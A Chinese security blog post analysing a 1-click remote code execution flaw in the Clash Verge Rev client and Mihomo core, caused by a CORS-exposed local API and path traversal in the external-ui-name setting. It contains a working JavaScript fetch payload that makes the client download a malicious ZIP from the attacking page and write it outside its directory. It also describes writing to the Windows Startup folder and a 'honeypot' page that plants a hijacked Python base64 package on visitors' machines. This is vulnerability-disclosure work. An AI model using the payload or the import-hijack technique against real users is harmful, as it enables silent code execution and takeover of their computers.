#  Clash Verge 客户端 1-Click RCE 漏洞与蜜罐利用分析   
Hee  安全的黑魔法   2025-05-23 14:17  
  
## Clash Verge 客户端 1-Click RCE 漏洞与蜜罐利用分析  
### 漏洞分析  
#### 影响范围与组件  
  
此漏洞影响特定版本的 Clash Verge 客户端及其集成的 Mihomo 核心。详细受影响组件及版本如下表所示：  
<table><thead><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">名称</span></section></th><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">版本</span></section></th><th style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;font-weight: bold;background-color: #f0f0f0;"><section><span leaf="">地址</span></section></th></tr></thead><tbody><tr style="border: 0;border-top: 1px solid #ccc;background-color: white;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">Clash Verge Rev</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">v2.2.4 alpha（当前最新）</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">https://github.com/clash-verge-rev/clash-verge-rev</span></section></td></tr><tr style="border: 0;border-top: 1px solid #ccc;background-color: #F8F8F8;"><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">Mihomo</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">v1.19.8 （当前最新）</span></section></td><td style="font-size: 16px;border: 1px solid #ccc;padding: 5px 10px;text-align: left;"><section><span leaf="">https://github.com/MetaCubeX/mihomo/tree/Meta</span></section></td></tr></tbody></table>#### 技术成因与原理  
  
该漏洞的核心在于一处任意文件写入缺陷，可进一步升级为远程代码执行（RCE）。其触发与利用涉及以下几个关键环节：  
1. **API服务暴露与CORS配置不当**  
：Clash Verge 客户端在默认配置下，会于 http://127.0.0.1:9097  
 启动一个RESTFul API服务。由于存在CORS（跨源资源共享）配置问题，允许恶意构造的网页跨域调用此API。  
  
1. **通过API修改核心配置**  
：攻击者可利用上述API中的 /configs  
 端点，向客户端提交恶意的配置数据，从而篡改Mihomo（Clash核心）的运行配置。  
  
1. **路径遍历漏洞与任意文件写入**  
：Mihomo核心的配置文件中包含 external-ui-url  
 和 external-ui-name  
 字段。external-ui-url  
 用于指定一个ZIP压缩包的下载地址，客户端会下载此ZIP包并解压。external-ui-name  
 则用于指定解压的子目录名称。尽管 external-ui  
 字段本身可能存在路径穿越检查，但 external-ui-name  
 字段的检查不完善，攻击者可利用 ..\  
 等字符进行路径遍历，将ZIP包中的恶意文件解压到系统任意可写位置。  
  
1. **实现远程代码执行（RCE）**  
：成功实现任意文件写入后，攻击者可通过多种方式将此升级为RCE。例如，可以将恶意脚本或程序写入系统的自启动目录、覆盖常用软件的插件（如本文后续将以IDA插件为例说明）、或利用DLL劫持等技术。  
  
以下JavaScript代码片段演示了如何通过 fetch  
 API调用本地服务，触发文件下载与路径遍历写入：  
```
fetch("http://127.0.0.1:9097/configs", {    method: "PUT",    headers: { 'Content-Type': 'application/json' },    body: JSON.stringify({        payload: `external-ui: 任意名称external-ui-url: ${document.location.origin + '/malware.zip'}external-ui-name: ..\\..\\..\\..\\目标路径`, // 此处利用路径遍历        path: ""    })})
```  
### 高级利用：构建蜜罐  
  
鉴于此漏洞具备的任意文件写入能力，使其非常适合用于构建客户端蜜罐，用以检测和捕获针对性的攻击尝试。  
#### 文件写入行为模式  
  
深入理解漏洞在文件写入时的具体行为模式，对于精确利用此漏洞或设计有效的蜜罐至关重要。根据测试，其写入行为主要分为以下两种情况：  
1. **空目录写入行为**  
：  
  
1. 若 external-ui-name  
 参数指向一个已存在的空目录，则ZIP压缩包内的文件内容会直接解压至该目录，并不会创建额外的子目录。  
  
1. 例如：若 external-ui-name  
 设置为 ..\..\..\..\..\..\2123  
，且 C:\2123  
 是一个存在的空目录，则ZIP包内容将被直接解压到 C:\2123\  
 目录下。  
  
1. **非空目录或不存在路径的写入行为**  
：  
  
1. 若 external-ui-name  
 参数指向一个非空目录，或该路径本身不存在，系统则会在指定路径的末端组件创建一个新的子目录，并将ZIP压缩包内容解压到这个新创建的子目录中。  
  
1. 例如：若 external-ui-name  
 设置为 ..\..\Microsoft\Windows\Start Menu\Programs\Startup\MyFolder  
，系统会在 Startup  
 目录下创建一个名为 MyFolder  
 的子目录，然后将ZIP内容解压至 Startup\MyFolder\  
。  
  
#### 蜜罐实现：Python库劫持  
  
基于上述文件写入行为，可以设计一个蜜罐页面，当用户访问时，利用此漏洞向其本地写入恶意文件，从而实现特定条件下的代码执行。以下以劫持Python标准库为例进行说明：  
  
Python在导入一个模块（例如 import base64  
）时，会按照其搜索路径（sys.path  
）查找。  
  
它会首先尝试寻找一个名为 base64  
 的**目录**  
（即一个包），如果找到该目录，则会执行该目录下的 __init__.py  
 文件来初始化这个包。  
  
只有在找不到名为 base64  
 的目录时，Python才会继续寻找名为 base64.py  
 的**文件**  
（即一个模块）。  
  
利用这一特性，我们可以通过此漏洞在目标Python库路径下（或sys.path  
中优先级更高的位置）创建一个名为 base64  
 的**文件夹**  
（即伪装成一个包），并在该文件夹内放置一个恶意的 __init__.py  
 文件。当用户后续执行的Python脚本尝试导入 base64  
 库时，我们的恶意 __init__.py  
 将被优先执行，从而达到代码执行的目的。  
  
下图展示了Python库的典型存放路径：![image-20250523101848436](https://mmbiz.qpic.cn/sz_mmbiz_png/o85eMywxzFThL7G5unG7e1BXe9vqmribyNwCtkOGcZnS429iacFibE4kCkiah8oMC7FCrtBSONMxlIbFBRq3nFsYeQ/640?wx_fmt=png&from=appmsg "")  
  
  
正常情况下，Python加载标准 base64  
 库的过程：![PixPin_2025-05-23_10-19-37](https://mmbiz.qpic.cn/sz_mmbiz_gif/o85eMywxzFThL7G5unG7e1BXe9vqmribyWuEvoN0TEh3ecLD46IkaDmzFnC78MenCia0KzicMsa2SjdP0XdgfebwA/640?wx_fmt=gif&from=appmsg "")  
  
  
漏洞利用示例——通过写入恶意的 base64  
 文件夹（包含恶意 __init__.py  
）实现劫持，并在导入时执行非预期代码（如弹出计算器）：![PixPin_2025-05-23_10-24-47](https://mmbiz.qpic.cn/sz_mmbiz_gif/o85eMywxzFThL7G5unG7e1BXe9vqmribyO5eicRM1LRH8q1XnGoartKLXb22SlCCrmz66rgHkiblGiaMEfB1ufx0Og/640?wx_fmt=gif&from=appmsg "")  
  
#### 风险总结  
  
此Clash Verge客户端漏洞带来了显著的安全风险。用户在使用了受影响版本的客户端时，仅仅通过浏览器访问一个嵌入了恶意JavaScript代码的网页，就可能在毫不知情的情况下被植入恶意文件，进而导致其计算机被攻击者远程控制。这是一个典型的"1-Click"式攻击场景，用户交互极少，隐蔽性高，危害性大。  
#### 参考链接：  
> https://zyen84kyvn.feishu.cn/docx/PXu6dsXf0onNdRxs8LfceNXjncb  
  
  
  
